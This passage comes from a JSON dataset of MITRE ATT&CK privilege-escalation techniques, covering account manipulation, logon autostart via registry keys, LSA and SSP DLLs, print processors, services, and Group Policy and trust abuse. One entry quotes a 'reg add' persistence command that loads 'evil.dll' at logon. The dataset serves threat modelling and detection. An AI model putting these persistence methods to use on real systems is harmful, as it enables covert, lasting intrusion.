    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Access Token Manipulation",
    "parent_technique_id": "T1134",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:01:48.845804"
  },
  {
    "technique_id": "T1098",
    "name": "Account Manipulation",
    "description": "Adversaries may manipulate accounts to maintain and/or elevate access to victim systems. Account manipulation may consist of any action that preserves or modifies adversary access to a compromised account, such as modifying credentials or permission groups.[1]These actions could also include account activity designed to subvert security policies, such as performing iterative password updates to bypass password duration policies and preserve the life of compromised credentials.In order to create or manipulate accounts, the adversary must already have sufficient permissions on systems or the domain. However, account manipulation may also lead to privilege escalation where modifications grant access to additional roles, permissions, or higher-privilegedValid Accounts.",
    "tactic": "Privilege Escalation",
    "tactics": [
      "Privilege Escalation"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:01:52.102261",
    "subtechniques": [
      {
        "id": "T1098.002",
        "name": "Additional Email Delegate Permissions"
      },
      {
        "id": "T1098.005",
        "name": "Device Registration"
      },
      {
        "id": "T1098.007",
        "name": "Additional Local or Domain Groups"
      }
    ]
  },
  {
    "technique_id": "T1098.002",
    "name": "Additional Email Delegate Permissions",
    "description": "Adversaries may grant additional permission levels to maintain persistent access to an adversary-controlled email account.For example, theAdd-MailboxPermissionPowerShellcmdlet, available in on-premises Exchange and in the cloud-based service Office 365, adds permissions to a mailbox.[1][2][3]In Google Workspace, delegation can be enabled via the Google Admin console and users can delegate accounts via their Gmail settings.[4][5]Adversaries may also assign mailbox folder permissions through individual folder permissions or roles. In Office 365 environments, adversaries may assign the Default or Anonymous user permissions or roles to the Top of Information Store (root), Inbox, or other mailbox folders. By assigning one or both user permissions to a folder, the adversary can utilize any other account in the tenant to maintain persistence to the target userâ€™s mail folders.[6]This may be used in persistent threat incidents as well as BEC (Business Email Compromise) incidents where an adversary can addAdditional Cloud Rolesto the accounts they wish to compromise. This may further enable use of additional techniques for gaining access to systems. For example, compromised business accounts are often used to send messages to other accounts in the network of the target business while creating inbox rules (ex:Internal Spearphishing), so the messages evade spam/phishing detection mechanisms.[7]",
    "tactic": "Privilege Escalation",
    "tactics": [
      "Privilege Escalation"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Account Manipulation",
    "parent_technique_id": "T1098",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:01:55.356539"
  },
  {
    "technique_id": "T1098.005",
    "name": "Device Registration",
    "description": "Adversaries may register a device to an adversary-controlled account. Devices may be registered in a multifactor authentication (MFA) system, which handles authentication to the network, or in a device management system, which handles device access and compliance.MFA systems, such as Duo or Okta, allow users to associate devices with their accounts in order to complete MFA requirements. An adversary that compromises a userâ€™s credentials may enroll a new device in order to bypass initial MFA requirements and gain persistent access to a network.[1][2]In some cases, the MFA self-enrollment process may require only a username and password to enroll the account's first device or to enroll a device to an inactive account.[3]Similarly, an adversary with existing access to a network may register a device to Entra ID and/or its device management system, Microsoft Intune, in order to access sensitive data or resources while bypassing conditional access policies.[4][5][6]Devices registered in Entra ID may be able to conductInternal Spearphishingcampaigns via intra-organizational emails, which are less likely to be treated as suspicious by the email client.[7]Additionally, an adversary may be able to perform aService Exhaustion Floodon an Entra ID tenant by registering a large number of devices.[8]",
    "tactic": "Privilege Escalation",
    "tactics": [
      "Privilege Escalation"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Account Manipulation",
    "parent_technique_id": "T1098",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:01:58.594730"
  },
  {
    "technique_id": "T1098.007",
    "name": "Additional Local or Domain Groups",
    "description": "An adversary may add additional local or domain groups to an adversary-controlled account to maintain persistent access to a system or domain.On Windows, accounts may use thenet localgroupandnet groupcommands to add existing users to local and domain groups.[1][2]On Linux, adversaries may use theusermodcommand for the same purpose.[3]For example, accounts may be added to the local administrators group on Windows devices to maintain elevated privileges. They may also be added to the Remote Desktop Users group, which allows them to leverageRemote Desktop Protocolto log into the endpoints in the future.[4]On Linux, accounts may be added to the sudoers group, allowing them to persistently leverageSudo and Sudo Cachingfor elevated privileges.In Windows environments, machine accounts may also be added to domain groups. This allows the local SYSTEM account to gain privileges on the domain.[5]",
    "tactic": "Privilege Escalation",
    "tactics": [
      "Privilege Escalation"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Account Manipulation",
    "parent_technique_id": "T1098",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:02:01.832492"
  },
  {
    "technique_id": "T1547",
    "name": "Boot or Logon Autostart Execution",
    "description": "Adversaries may configure system settings to automatically execute a program during system boot or logon to maintain persistence or gain higher-level privileges on compromised systems. Operating systems may have mechanisms for automatically running a program on system boot or account logon.[1][2][3][4][5]These mechanisms may include automatically executing programs that are placed in specially designated directories or are referenced by repositories that store configuration information, such as the Windows Registry. An adversary may achieve the same goal by modifying or extending features of the kernel.Since some boot or logon autostart programs run with higher privileges, an adversary may leverage these to elevate privileges.",
    "tactic": "Privilege Escalation",
    "tactics": [
      "Privilege Escalation"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:02:05.077650",
    "subtechniques": [
      {
        "id": "T1547.001",
        "name": "Registry Run Keys / Startup Folder"
      },
      {
        "id": "T1547.002",
        "name": "Authentication Package"
      },
      {
        "id": "T1547.003",
        "name": "Time Providers"
      },
      {
        "id": "T1547.004",
        "name": "Winlogon Helper DLL"
      },
      {
        "id": "T1547.005",
        "name": "Security Support Provider"
      },
      {
        "id": "T1547.008",
        "name": "LSASS Driver"
      },
      {
        "id": "T1547.009",
        "name": "Shortcut Modification"
      },
      {
        "id": "T1547.010",
        "name": "Port Monitors"
      },
      {
        "id": "T1547.012",
        "name": "Print Processors"
      },
      {
        "id": "T1547.014",
        "name": "Active Setup"
      }
    ]
  },
  {
    "technique_id": "T1547.001",
    "name": "Registry Run Keys / Startup Folder",
    "description": "Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the \"run keys\" in the Registry or startup folder will cause the program referenced to be executed when a user logs in.[1]These programs will be executed under the context of the user and will have the account's associated permissions level.The following run keys are created by default on Windows systems:HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceRun keys may exist under multiple hives.[2][3]TheHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceExis also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency.[1]For example, it is possible to load a DLL at logon using a \"Depend\" key with RunOnceEx:reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \"C:\\temp\\evil[.]dll\"[4]Placing a program within a startup folder will also cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in. The startup folder path for the current user isC:\\Users\\[Username]\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup. The startup folder path for all users isC:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp.The following Registry keys can be used to set startup folder items for persistence:HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell FoldersHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell FoldersHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell FoldersHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell FoldersThe following Registry keys can control automatic startup of services during boot:HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnceHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnceHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesUsing policy settings to specify startup programs creates corresponding values in either of two Registry keys:HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\RunHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\RunPrograms listed in the load value of the registry keyHKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windowsrun automatically for the currently logged-on user.By default, the multistringBootExecutevalue of the registry keyHKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manageris set toautocheck autochk *. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.Adversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also useMasqueradingto make the Registry entries look as if they are associated with legitimate programs.",
    "tactic": "Privilege Escalation",
    "tactics": [
      "Privilege Escalation"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Boot or Logon Autostart Execution",
    "parent_technique_id": "T1547",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:02:08.465868"
  },
  {
    "technique_id": "T1547.002",
    "name": "Authentication Package",
    "description": "Adversaries may abuse authentication packages to execute DLLs when the system boots. Windows authentication package DLLs are loaded by the Local Security Authority (LSA) process at system start. They provide support for multiple logon processes and multiple security protocols to the operating system.[1]Adversaries can use the autostart mechanism provided by LSA authentication packages for persistence by placing a reference to a binary in the Windows Registry locationHKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\with the key value of\"Authentication Packages\"=<target binary>. The binary will then be executed by the system when the authentication packages are loaded.",
    "tactic": "Privilege Escalation",
    "tactics": [
      "Privilege Escalation"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Boot or Logon Autostart Execution",
    "parent_technique_id": "T1547",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:02:11.710741"
  },
  {
    "technique_id": "T1547.003",
    "name": "Time Providers",
    "description": "Adversaries may abuse time providers to execute DLLs when the system boots. The Windows Time service (W32Time) enables time synchronization across and within domains.[1]W32Time time providers are responsible for retrieving time stamps from hardware/network resources and outputting these values to other network clients.[2]Time providers are implemented as dynamic-link libraries (DLLs) that are registered in the subkeys ofHKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\.[2]The time provider manager, directed by the service control manager, loads and starts time providers listed and enabled under this key at system startup and/or whenever parameters are changed.[2]Adversaries may abuse this architecture to establish persistence, specifically by creating a new arbitrarily named subkey  pointing to a malicious DLL in theDllNamevalue. Administrator privileges are required for time provider registration, though execution will run in context of the Local Service account.[3]",
    "tactic": "Privilege Escalation",
    "tactics": [
      "Privilege Escalation"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Boot or Logon Autostart Execution",
    "parent_technique_id": "T1547",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:02:14.948430"
  },
  {
    "technique_id": "T1547.004",
    "name": "Winlogon Helper DLL",
    "description": "Adversaries may abuse features of Winlogon to execute DLLs and/or executables when a user logs in. Winlogon.exe is a Windows component responsible for actions at logon/logoff as well as the secure attention sequence (SAS) triggered by Ctrl-Alt-Delete. Registry entries inHKLM\\Software[\\Wow6432Node\\]\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\andHKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\are used to manage additional helper programs and functionalities that support Winlogon.[1]Malicious modifications to these Registry keys may cause Winlogon to load and execute malicious DLLs and/or executables. Specifically, the following subkeys have been known to be possibly vulnerable to abuse:[1]Winlogon\\Notify - points to notification package DLLs that handle Winlogon eventsWinlogon\\Userinit - points to userinit.exe, the user initialization program executed when a user logs onWinlogon\\Shell - points to explorer.exe, the system shell executed when a user logs onAdversaries may take advantage of these features to repeatedly execute malicious code and establish persistence.",
    "tactic": "Privilege Escalation",
    "tactics": [
      "Privilege Escalation"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Boot or Logon Autostart Execution",
    "parent_technique_id": "T1547",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:02:18.291220"
  },
  {
    "technique_id": "T1547.005",
    "name": "Security Support Provider",
    "description": "Adversaries may abuse security support providers (SSPs) to execute DLLs when the system boots. Windows SSP DLLs are loaded into the Local Security Authority (LSA) process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs.The SSP configuration is stored in two Registry keys:HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security PackagesandHKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\Security Packages. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.[1]",
    "tactic": "Privilege Escalation",
    "tactics": [
      "Privilege Escalation"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Boot or Logon Autostart Execution",
    "parent_technique_id": "T1547",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:02:21.616223"
  },
  {
    "technique_id": "T1547.008",
    "name": "LSASS Driver",
    "description": "Adversaries may modify or add LSASS drivers to obtain persistence on compromised systems. The Windows security subsystem is a set of components that manage and enforce the security policy for a computer or domain. The Local Security Authority (LSA) is the main component responsible for local security policy and user authentication. The LSA includes multiple dynamic link libraries (DLLs) associated with various other security functions, all of which run in the context of the LSA Subsystem Service (LSASS) lsass.exe process.[1]Adversaries may target LSASS drivers to obtain persistence. By either replacing or adding illegitimate drivers (e.g.,Hijack Execution Flow), an adversary can use LSA operations to continuously execute malicious payloads.",
    "tactic": "Privilege Escalation",
    "tactics": [
      "Privilege Escalation"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Boot or Logon Autostart Execution",
    "parent_technique_id": "T1547",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:02:24.979145"
  },
  {
    "technique_id": "T1547.009",
    "name": "Shortcut Modification",
    "description": "Adversaries may create or modify shortcuts that can execute a program during system boot or user login. Shortcuts or symbolic links are used to reference other files or programs that will be opened or executed when the shortcut is clicked or executed by a system startup process.Adversaries may abuse shortcuts in the startup folder to execute their tools and achieve persistence.[1]Although often used as payloads in an infection chain (e.g.Spearphishing Attachment), adversaries may also create a new shortcut as a means of indirection, while also abusingMasqueradingto make the malicious shortcut appear as a legitimate program. Adversaries can also edit the target path or entirely replace an existing shortcut so their malware will be executed instead of the intended legitimate program.Shortcuts can also be abused to establish persistence by implementing other methods. For example, LNK browser extensions may be modified (e.g.Browser Extensions) to persistently launch malware.",
    "tactic": "Privilege Escalation",
    "tactics": [
      "Privilege Escalation"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Boot or Logon Autostart Execution",
    "parent_technique_id": "T1547",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:02:28.344098"
  },
  {
    "technique_id": "T1547.010",
    "name": "Port Monitors",
    "description": "Adversaries may use port monitors to run an adversary supplied DLL during system boot for persistence or privilege escalation. A port monitor can be set through theAddMonitorAPI call to set a DLL to be loaded at startup.[1]This DLL can be located inC:\\Windows\\System32and will be loaded and run by the print spooler service,spoolsv.exe, under SYSTEM level permissions on boot.[2]Alternatively, an arbitrary DLL can be loaded if permissions allow writing a fully-qualified pathname for that DLL to theDrivervalue of an existing or new arbitrarily named subkey ofHKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors. The Registry key contains entries for the following:Local PortStandard TCP/IP PortUSB MonitorWSD Port",
    "tactic": "Privilege Escalation",
    "tactics": [
      "Privilege Escalation"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Boot or Logon Autostart Execution",
    "parent_technique_id": "T1547",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:02:31.611827"
  },
  {
    "technique_id": "T1547.012",
    "name": "Print Processors",
    "description": "Adversaries may abuse print processors to run malicious DLLs during system boot for persistence and/or privilege escalation. Print processors are DLLs that are loaded by the print spooler service,spoolsv.exe, during boot.[1]Adversaries may abuse the print spooler service by adding print processors that load malicious DLLs at startup. A print processor can be installed through theAddPrintProcessorAPI call with an account that hasSeLoadDriverPrivilegeenabled. Alternatively, a print processor can be registered to the print spooler service by adding theHKLM\\SYSTEM\\[CurrentControlSet or ControlSet001]\\Control\\Print\\Environments\\[Windows architecture: e.g., Windows x64]\\Print Processors\\[user defined]\\DriverRegistry key that points to the DLL.For the malicious print processor to be correctly installed, the payload must be located in the dedicated system print-processor directory, that can be found with theGetPrintProcessorDirectoryAPI call, or referenced via a relative path from this directory.[2]After the print processors are installed, the print spooler service, which starts during boot, must be restarted in order for them to run.[3]The print spooler service runs under SYSTEM level permissions, therefore print processors installed by an adversary may run under elevated privileges.",
    "tactic": "Privilege Escalation",
    "tactics": [
      "Privilege Escalation"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Boot or Logon Autostart Execution",
    "parent_technique_id": "T1547",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:02:34.885147"
  },
  {
    "technique_id": "T1547.014",
    "name": "Active Setup",
    "description": "Adversaries may achieve persistence by adding a Registry key to the Active Setup of the local machine. Active Setup is a Windows mechanism that is used to execute programs when a user logs in. The value stored in the Registry key will be executed after a user logs into the computer.[1]These programs will be executed under the context of the user and will have the account's associated permissions level.Adversaries may abuse Active Setup by creating a key underHKLM\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\and setting a malicious value forStubPath. This value will serve as the program that will be executed when a user logs into the computer.[2][3][4][5][6]Adversaries can abuse these components to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also useMasqueradingto make the Registry entries look as if they are associated with legitimate programs.",
    "tactic": "Privilege Escalation",
    "tactics": [
      "Privilege Escalation"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Boot or Logon Autostart Execution",
    "parent_technique_id": "T1547",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:02:38.243782"
  },
  {
    "technique_id": "T1037",
    "name": "Boot or Logon Initialization Scripts",
    "description": "Adversaries may use scripts automatically executed at boot or logon initialization to establish persistence.[1][2]Initialization scripts can be used to perform administrative functions, which may often execute other programs or send information to an internal logging server. These scripts can vary based on operating system and whether applied locally or remotely.Adversaries may use these scripts to maintain persistence on a single system. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary.An adversary may also be able to escalate their privileges since some boot or logon initialization scripts run with higher privileges.",
    "tactic": "Privilege Escalation",
    "tactics": [
      "Privilege Escalation"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:02:41.581256",
    "subtechniques": [
      {
        "id": "T1037.001",
        "name": "Logon Script (Windows)"
      },
      {
        "id": "T1037.003",
        "name": "Network Logon Script"
      }
    ]
  },
  {
    "technique_id": "T1037.001",
    "name": "Logon Script (Windows)",
    "description": "Adversaries may use Windows logon scripts automatically executed at logon initialization to establish persistence. Windows allows logon scripts to be run whenever a specific user or group of users log into a system.[1]This is done via adding a path to a script to theHKCU\\Environment\\UserInitMprLogonScriptRegistry key.[2]Adversaries may use these scripts to maintain persistence on a single system. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary.",
    "tactic": "Privilege Escalation",
    "tactics": [
      "Privilege Escalation"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Boot or Logon Initialization Scripts",
    "parent_technique_id": "T1037",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:02:44.836959"
  },
  {
    "technique_id": "T1037.003",
    "name": "Network Logon Script",
    "description": "Adversaries may use network logon scripts automatically executed at logon initialization to establish persistence. Network logon scripts can be assigned using Active Directory or Group Policy Objects.[1]These logon scripts run with the privileges of the user they are assigned to. Depending on the systems within the network, initializing one of these scripts could apply to more than one or potentially all systems.Adversaries may use these scripts to maintain persistence on a network. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary.",
    "tactic": "Privilege Escalation",
    "tactics": [
      "Privilege Escalation"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Boot or Logon Initialization Scripts",
    "parent_technique_id": "T1037",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:02:48.069883"
  },
  {
    "technique_id": "T1543",
    "name": "Create or Modify System Process",
    "description": "Adversaries may create or modify system-level processes to repeatedly execute malicious payloads as part of persistence. When operating systems boot up, they can start processes that perform background system functions. On Windows and Linux, these system processes are referred to as services.[1]On macOS, launchd processes known asLaunch DaemonandLaunch Agentare run to finish system initialization and load user specific parameters.[2]Adversaries may install new services, daemons, or agents that can be configured to execute at startup or a repeatable interval in order to establish persistence. Similarly, adversaries may modify existing services, daemons, or agents to achieve the same effect.Services, daemons, or agents may be created with administrator privileges but executed under root/SYSTEM privileges. Adversaries may leverage this functionality to create or modify system processes in order to escalate privileges.[3]",
    "tactic": "Privilege Escalation",
    "tactics": [
      "Privilege Escalation"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:02:51.416832",
    "subtechniques": [
      {
        "id": "T1543.003",
        "name": "Windows Service"
      }
    ]
  },
  {
    "technique_id": "T1543.003",
    "name": "Windows Service",
    "description": "Adversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it starts programs or applications called services that perform background system functions.[1]Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Windows Registry.Adversaries may install a new service or modify an existing service to execute at startup in order to persist on a system. Service configurations can be set or modified using system utilities (such as sc.exe), by directly modifying the Registry, or by interacting directly with the Windows API.Adversaries may also use services to install and execute malicious drivers. For example, after dropping a driver file (ex:.sys) to disk, the payload can be loaded and registered viaNative APIfunctions such asCreateServiceW()(or manually via functions such asZwLoadDriver()andZwSetValueKey()), by creating the required service Registry values (i.e.Modify Registry), or by using command-line utilities such asPnPUtil.exe.[2][3][4]Adversaries may leverage these drivers asRootkits to hide the presence of malicious activity on a system. Adversaries may also load a signed yet vulnerable driver onto a compromised machine (known as \"Bring Your Own Vulnerable Driver\" (BYOVD)) as part ofExploitation for Privilege Escalation.[5][4]Services may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges. Adversaries may also directly start services throughService Execution.To make detection analysis more challenging, malicious services may also incorporateMasquerade Task or Service(ex: using a service and/or payload name related to a legitimate OS or benign software component). Adversaries may also create â€˜hiddenâ€™ services (i.e.,Hide Artifacts), for example by using thesc sdsetcommand to set service permissions via the Service Descriptor Definition Language (SDDL). This may hide a Windows service from the view of standard service enumeration methods such asGet-Service,sc query, andservices.exe.[6][7]",
    "tactic": "Privilege Escalation",
    "tactics": [
      "Privilege Escalation"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Create or Modify System Process",
    "parent_technique_id": "T1543",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:02:54.856467"
  },
  {
    "technique_id": "T1484",
    "name": "Domain or Tenant Policy Modification",
    "description": "Adversaries may modify the configuration settings of a domain or identity tenant to evade defenses and/or escalate privileges in centrally managed environments. Such services provide a centralized means of managing identity resources such as devices and accounts, and often include configuration settings that may apply between domains or tenants such as trust relationships, identity syncing, or identity federation.Modifications to domain or tenant settings may include altering domain Group Policy Objects (GPOs) in Microsoft Active Directory (AD) or changing trust settings for domains, including federation trusts relationships between domains or tenants.With sufficient permissions, adversaries can modify domain or tenant policy settings. Since configuration settings for these services apply to a large number of identity resources, there are a great number of potential attacks malicious outcomes that can stem from this abuse. Examples of such abuse include:modifying GPOs to push a maliciousScheduled Taskto computers throughout the domain environment[1][2][3]modifying domain trusts to include an adversary-controlled domain, allowing adversaries to  forge access tokens that will subsequently be accepted by victim domain resources[4]changing configuration settings within the AD environment to implement aRogue Domain Controller.adding new, adversary-controlled federated identity providers to identity tenants, allowing adversaries to authenticate as any user managed by the victim tenant[5]Adversaries may temporarily modify domain or tenant policy, carry out a malicious action(s), and then revert the change to remove suspicious indicators.",
    "tactic": "Privilege Escalation",
    "tactics": [
      "Privilege Escalation"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:02:58.193467",
    "subtechniques": [
      {
        "id": "T1484.001",
        "name": "Group Policy Modification"
      },
      {
        "id": "T1484.002",
        "name": "Trust Modification"
      }
    ]
  },
  {
    "technique_id": "T1484.001",
    "name": "Group Policy Modification",
    "description": "Adversaries may modify Group Policy Objects (GPOs) to subvert the intended discretionary access controls for a domain, usually with the intention of escalating privileges on the domain. Group policy allows for centralized management of user and computer settings in Active Directory (AD). GPOs are containers for group policy settings made up of files stored within a predictable network path\\<DOMAIN>\\SYSVOL\\<DOMAIN>\\Policies\\.[1][2]Like other objects in AD, GPOs have access controls associated with them. By default all user accounts in the domain have permission to read GPOs. It is possible to delegate GPO access control permissions, e.g. write access, to specific users or groups in the domain.Malicious GPO modifications can be used to implement many other malicious behaviors such asScheduled Task/Job,Disable or Modify Tools,Ingress Tool Transfer,Create Account,Service Execution,  and more.[2][3][4][5][6]Since GPOs can control so many user and machine settings in the AD environment, there are a great number of potential attacks that can stem from this GPO abuse.[3]For example, publicly available scripts such asNew-GPOImmediateTaskcan be leveraged to automate the creation of a maliciousScheduled Task/Jobby modifying GPO settings, in this case modifying<GPO_PATH>\\Machine\\Preferences\\ScheduledTasks\\ScheduledTasks.xml.[3][4]In some cases an adversary might modify specific user rights like SeEnableDelegationPrivilege, set in<GPO_PATH>\\MACHINE\\Microsoft\\Windows NT\\SecEdit\\GptTmpl.inf, to achieve a subtle AD backdoor with complete control of the domain because the user account under the adversary's control would then be able to modify GPOs.[7]",
    "tactic": "Privilege Escalation",
    "tactics": [
      "Privilege Escalation"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Domain or Tenant Policy Modification",
    "parent_technique_id": "T1484",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:03:01.534157"
  },
  {
    "technique_id": "T1484.002",
    "name": "Trust Modification",
    "description": "Adversaries may add new domain trusts, modify the properties of existing domain trusts, or otherwise change the configuration of trust relationships between domains and tenants to evade defenses and/or elevate privileges.Trust details, such as whether or not user identities are federated, allow authentication and authorization properties to apply between domains or tenants for the purpose of accessing shared resources.[1]These trust objects may include accounts, credentials, and other authentication material applied to servers, tokens, and domains.Manipulating these trusts may allow an adversary to escalate privileges and/or evade defenses by modifying settings to add objects which they control. For example, in Microsoft Active Directory (AD) environments, this may be used to forgeSAML Tokenswithout the need to compromise the signing certificate to forge new credentials. Instead, an adversary can manipulate domain trusts to add their own signing certificate. An adversary may also convert an AD domain to a federated domain using Active Directory Federation Services (AD FS), which may enable malicious trust modifications such as altering the claim issuance rules to log in any valid set of credentials as a specified user.[2]An adversary may also add a new federated identity provider to an identity tenant such as Okta or AWS IAM Identity Center, which may enable the adversary to authenticate as any user of the tenant.[3]This may enable the threat actor to gain broad access into a variety of cloud-based services that leverage the identity tenant. For example, in AWS environments, an adversary that creates a new identity provider for an AWS Organization will be able to federate into all of the AWS Organization member accounts without creating identities for each of the member accounts.[4]",
    "tactic": "Privilege Escalation",
    "tactics": [
      "Privilege Escalation"
    ],
